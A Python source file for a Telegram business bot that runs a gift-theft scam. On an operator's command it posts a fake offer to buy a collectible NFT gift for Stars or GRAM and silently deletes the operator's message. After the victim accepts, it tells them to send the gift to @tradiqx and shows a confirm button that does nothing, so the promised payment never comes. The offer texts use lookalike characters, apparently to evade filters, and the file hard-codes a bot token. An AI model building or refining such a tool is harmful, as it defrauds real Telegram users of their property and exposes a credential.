import asyncio
import re
import random
import string
import logging
import json
import time
import aiohttp
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    LinkPreviewOptions,
)

logging.basicConfig(level=logging.WARNING)

BOT_TOKEN = "8978690686:AAELZXGHB1c06yCISeFaNrFgsD9QXg6vh0I"

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

GIFT_RE = re.compile(r"t\.me/nft/([A-Za-z]+?)-(\d+)")
RECIPIENT = "@tradiqx"
LANG_TAGS = {"ru", "ukr", "eng", "cn", "en", "uk", "zh"}

E_GEM   = "5318901904686754959"
E_WARN  = "6030563507299160824"
E_OK    = "5774022692642492953"
E_NO    = "5774077015388852135"
E_TIMER = "6037268453759389862"
E_GIFT  = "5773677501825945508"
E_STAR  = "6028338546736107668"
E_CHECK = "5774022692642492953"
E_LOCK  = "5774077015388852135"

# chat_id → последний message_id от юзера
_last_user_msg: dict[int, int] = {}
# chat_id → время последней отправки оффера
_last_sent: dict[int, float] = {}
SEND_COOLDOWN = 30.0


def em(eid: str, fallback: str) -> str:
    return f'<tg-emoji emoji-id="{eid}">{fallback}</tg-emoji>'


TEXTS = {
    "ru": {
        "offer_1":     "Пoльзoвaтeль пpeдлaгaeт вaм",
        "offer_for":   "зa кoллeкциoнный пpeдмeт",
        "offer_time":  "Пpeдлoжeниe дeйcтвyeт eщё 5 ч. 59 мин.",
        "offer_fix":   "Сдeлкa фикcиpyeтcя кнoпкoй «Пpинять».",
        "accept_ok":   "Уcпeшнo пpoдaн!",
        "accept_give": "• Пepeдaйтe пoкyпaтeлю для зaчиcлeния Ѕtarѕ.",
        "accept_then": "Зaтeм нaжмитe «Пoдтвepдить пepeдaчy».",
        "accept_warn": "Кнoпкa cpaбoтaeт тoлькo ecли пoдapoк yжe y пoлyчaтeля.",
        "accept_price": "зa пoдapoк",
        "order":       "Зaкaз",
        "recipient":   "пoлyчaтeль",
        "btn_decline": "Oтклoнить",
        "btn_accept":  "Пpинять",
        "btn_show":    "Пoкaзaть пoдapoк",
        "btn_give":    "Пepeдaть пoдapoк",
        "btn_confirm": "Пoдтвepдить пepeдaчy",
        "declined":    "Oффep был oтклoнён.",
        "stars": "Звёзд",
        "gram":  "GRAM",
    },
    "ukr": {
        "offer_1":     "Кopиcтyвaч пpoпoнyє вaм",
        "offer_for":   "зa пoдapyнoк",
        "offer_time":  "Пpoпoзицiя дiйcнa щe 6 гoд. 0 хв. 0 ceк.",
        "offer_fix":   "Угoдa фiкcyєтьcя кнoпкoю «Пpийняти».",
        "accept_ok":   "Пpoпoзицiю пpийнятo",
        "accept_give": "Пepeдaйтe пoдapyнoк",
        "accept_then": "Пoтiм нaтиcнiть «Пiдтвepдити пepeдaчy».",
        "accept_warn": "Кнoпкa cпpaцює лишe якщo пoдapyнoк вжe в oтpимyвaчa.",
        "accept_price": "зa пoдapyнoк",
        "order":       "Зaмoвлeння",
        "recipient":   "oтpимyвaч",
        "btn_decline": "Вiдхилити",
        "btn_accept":  "Пpийняти",
        "btn_show":    "Пoкaзaти пoдapyнoк",
        "btn_give":    "Пepeдaти пoдapyнoк",
        "btn_confirm": "Пiдтвepдити пepeдaчy",
        "declined":    "Пpoпoзицiю вiдхилeнo.",
        "stars": "Зipoк",
        "gram":  "GRAM",
    },
    "eng": {
        "offer_1":     "A uѕer оfferѕ yоu",
        "offer_for":   "fоr the gift",
        "offer_time":  "The оffer iѕ vаlid fоr аnоther 6 h. 0 min. 0 ѕec.",
        "offer_fix":   "The deаl iѕ fixed with the «Аccept» buttоn.",
        "accept_ok":   "Оffer аccepted",
        "accept_give": "Ѕend the gift",
        "accept_then": "Then preѕѕ «Cоnfirm trаnѕfer».",
        "accept_warn": "The buttоn wоrkѕ оnly if the gift iѕ аlreаdy with the recipient.",
        "accept_price": "fоr the gift",
        "order":       "Оrder",
        "recipient":   "recipient",
        "btn_decline": "Decline",
        "btn_accept":  "Аccept",
        "btn_show":    "Ѕhоw gift",
        "btn_give":    "Ѕend gift",
        "btn_confirm": "Cоnfirm trаnѕfer",
        "declined":    "The оffer wаѕ declined.",
        "stars": "Ѕtаrѕ",
        "gram":  "GRАM",
    },
    "cn": {
        "offer_1":     "用户向您提出报价",
        "offer_for":   "购买礼物",
        "offer_time":  "报价还有效 6 小时 0 分钟 0 秒。",
        "offer_fix":   "交易由「接受」按钮确认。",
        "accept_ok":   "报价已接受",
        "accept_give": "请发送礼物",
        "accept_then": "然后点击「确认转账」。",
        "accept_warn": "仅当礼物已在接收者处时按钮才会生效。",
        "accept_price": "购买礼物",
        "order":       "订单",
        "recipient":   "接收者",
        "btn_decline": "拒绝",
        "btn_accept":  "接受",
        "btn_show":    "显示礼物",
        "btn_give":    "发送礼物",
        "btn_confirm": "确认转账",
        "declined":    "报价已被拒绝。",
        "stars": "星",
        "gram":  "GRAM",
    },
}


def T(lang, key):
    return TEXTS.get(lang, TEXTS["ru"]).get(key, TEXTS["ru"][key])


def parse_command(text):
    if not text:
        return None
    parts = text.strip().split()
    if not parts:
        return None
    if parts[0].startswith("/"):
        parts = parts[1:]
    if parts and parts[0].startswith("@"):
        parts = parts[1:]
    # пропускаем триггер-слово (грокс или любое)
    if parts and not parts[0].startswith("http") and not parts[0].startswith("t.me"):
        try:
            float(parts[0].replace(",", "."))
        except ValueError:
            parts = parts[1:]
    if not parts:
        return None

    link = None
    amount = None
    currency = "STARS"
    lang = "ru"

    for p in parts:
        low = p.lower()
        if link is None and (p.startswith("http") or p.startswith("t.me")):
            link = p
            continue
        if low in LANG_TAGS:
            if low == "ru":
                lang = "ru"
            elif low in ("ukr", "uk"):
                lang = "ukr"
            elif low in ("eng", "en"):
                lang = "eng"
            elif low in ("cn", "zh"):
                lang = "cn"
            continue
        if low == "gram":
            currency = "GRAM"
            continue
        if low in ("stars", "star", "звёзд", "звезд", "звёзды", "звезды"):
            currency = "STARS"
            continue
        if amount is None:
            try:
                amount = float(p.replace(",", "."))
            except ValueError:
                pass

    if not link or amount is None:
        return None
    return link, amount, currency, lang


def parse_gift(link):
    m = GIFT_RE.search(link)
    if not m:
        return None
    slug = m.group(1)
    num = m.group(2)
    name = re.sub(r'(?<=[a-z])(?=[A-Z])|(?<=[A-Z])(?=[A-Z][a-z])', ' ', slug)
    return name, num


def amount_line(amount, currency, lang):
    word = T(lang, "gram" if currency == "GRAM" else "stars")
    if currency == "GRAM":
        return f'{em(E_GEM, "💎")} <b>{amount:.0f} {word}</b>'
    return f'{em(E_STAR, "⭐")} <b>{amount:.0f} {word}</b>'


def gift_link_bold(gift_name, gift_num, lang):
    slug = gift_name.replace(" ", "")
    return (
        f'<b><a href="https://t.me/nft/{slug}-{gift_num}">'
        f'{gift_name} #{gift_num}</a></b>'
    )


def build_offer_text(amount, currency, gift_name, gift_num, lang):
    return (
        f'{em(E_GIFT, "🎁")} {T(lang, "offer_1")}\n'
        f'{amount_line(amount, currency, lang)} {T(lang, "offer_for")} '
        f'{gift_link_bold(gift_name, gift_num, lang)}.\n\n'
        f'{em(E_TIMER, "⏱")} {T(lang, "offer_time")}\n'
        f'{em(E_LOCK, "🔒")} {T(lang, "offer_fix")}'
    )


def build_accept_text(amount, currency, gift_name, gift_num, order_id, lang):
    return (
        f'{em(E_CHECK, "✅")} {gift_link_bold(gift_name, gift_num, lang)} <b>{T(lang, "accept_ok")}</b>\n\n'
        f'{em(E_GIFT, "🎁")} {T(lang, "accept_give")} {gift_link_bold(gift_name, gift_num, lang)}.\n'
        f'{T(lang, "accept_then")}\n'
        f'{T(lang, "accept_warn")}\n\n'
        f'{amount_line(amount, currency, lang)} {T(lang, "accept_price")} '
        f'{gift_name} #{gift_num}.\n\n'
        f'<i>{T(lang, "order")} #{order_id}, {T(lang, "recipient")} {RECIPIENT}</i>'
    )


def pack_offer(amount, currency, gift_name, gift_num, lang):
    cur = "G" if currency == "GRAM" else "S"
    name = gift_name.replace(" ", "")
    return f"a|{gift_num}|{amount:.0f}|{cur}|{name}|{lang}"


def unpack_offer(data):
    parts = data.split("|", 5)
    if len(parts) != 6:
        return None
    _, gift_num, amount_s, cur, gift_name_compact, lang = parts
    try:
        amount = float(amount_s)
    except ValueError:
        return None
    currency = "GRAM" if cur == "G" else "STARS"
    name = re.sub(r'(?<!^)(?=[A-Z])', ' ', gift_name_compact)
    return amount, currency, name, gift_num, lang


def make_offer_keyboard(amount, currency, gift_name, gift_num, lang):
    accept_data = pack_offer(amount, currency, gift_name, gift_num, lang)
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=T(lang, "btn_decline"),
                    callback_data="decline",
                    icon_custom_emoji_id=E_NO,
                ),
                InlineKeyboardButton(
                    text=T(lang, "btn_accept"),
                    callback_data=accept_data,
                    icon_custom_emoji_id=E_OK,
                ),
            ]
        ]
    )


def make_accept_keyboard(gift_name, gift_num, lang):
    recipient = RECIPIENT.lstrip("@")
    slug = gift_name.replace(" ", "")
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=T(lang, "btn_show"),
                    url=f"https://t.me/nft/{slug}-{gift_num}",
                    icon_custom_emoji_id=E_GIFT,
                )
            ],
            [
                InlineKeyboardButton(
                    text=T(lang, "btn_give"),
                    url=f"tg://send_gift?to={recipient}",
                    icon_custom_emoji_id=E_GIFT,
                )
            ],
            [
                InlineKeyboardButton(
                    text=T(lang, "btn_confirm"),
                    callback_data="noop",
                    icon_custom_emoji_id=E_CHECK,
                )
            ],
        ]
    )


def gen_order_id():
    return "TG-" + "".join(
        random.choices(string.ascii_uppercase + string.digits, k=10)
    )


@dp.business_message(F.text)
async def handle_business_message(message: Message):
    bcid = message.business_connection_id
    if not bcid:
        return

    parsed = parse_command(message.text or "")

    if not parsed:
        # любое сообщение не-команда — кешируем как последнее сообщение в чате
        _last_user_msg[message.chat.id] = message.message_id
        return

    now = time.time()
    if now - _last_sent.get(message.chat.id, 0) < SEND_COOLDOWN:
        return
    _last_sent[message.chat.id] = now

    link, amount, currency, lang = parsed
    gift = parse_gift(link)
    if not gift:
        return
    gift_name, gift_num = gift

    # приоритет: reply оператора → кеш последнего сообщения в чате
    reply_to = None
    if message.reply_to_message:
        reply_to = message.reply_to_message.message_id
    if not reply_to:
        reply_to = _last_user_msg.get(message.chat.id)

    try:
        send_kwargs = dict(
            chat_id=message.chat.id,
            text=build_offer_text(amount, currency, gift_name, gift_num, lang),
            reply_markup=make_offer_keyboard(amount, currency, gift_name, gift_num, lang),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
        if reply_to:
            send_kwargs["reply_to_message_id"] = reply_to
        await bot.send_message(**send_kwargs)
    except Exception as e:
        logging.error(f"send error: {e}")
        return

    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteBusinessMessages"
        payload = {
            "business_connection_id": bcid,
            "message_ids": json.dumps([message.message_id]),
        }
        async with aiohttp.ClientSession() as s:
            async with s.post(url, data=payload) as r:
                result = await r.json()
                if not result.get("ok"):
                    logging.warning(f"deleteBusinessMessages failed: {result}")
    except Exception as e:
        logging.warning(f"delete error: {e}")


@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer(
        "🎁 Привет! Ответь на сообщение юзера командой:\n"
        "грокс https://t.me/nft/BerryBox-40761 15000 STARS ru\n"
        "грокс https://t.me/nft/BerryBox-40761 15 GRAM eng\n\n"
        "Языки: ru, ukr, eng, cn"
    )


@dp.callback_query(F.data.startswith("a|"))
async def accept(cb: CallbackQuery):
    data = unpack_offer(cb.data)
    if not data:
        await cb.answer("Ошибка данных", show_alert=True)
        return

    amount, currency, gift_name, gift_num, lang = data
    order_id = gen_order_id()
    text = build_accept_text(amount, currency, gift_name, gift_num, order_id, lang)

    try:
        await cb.message.edit_text(
            text=text,
            reply_markup=make_accept_keyboard(gift_name, gift_num, lang),
        )
    except Exception as e:
        logging.error(f"accept edit error: {e}")
        await cb.answer("Не удалось обновить", show_alert=True)
        return

    await cb.answer()


@dp.callback_query(F.data == "decline")
async def decline(cb: CallbackQuery):
    try:
        await cb.message.edit_text(
            text=f'{em(E_NO, "❌")} {T("ru", "declined")}',
            reply_markup=None,
        )
    except Exception as e:
        logging.error(f"decline edit error: {e}")
        await cb.answer("Не удалось обновить", show_alert=True)
        return
    await cb.answer()


@dp.callback_query(F.data == "noop")
async def noop(cb: CallbackQuery):
    await cb.answer()


async def main():
    print("Bot started")
    await dp.start_polling(
        bot,
        allowed_updates=[
            "callback_query",
            "business_connection",
            "business_message",
        ],
    )


if __name__ == "__main__":
    asyncio.run(main())
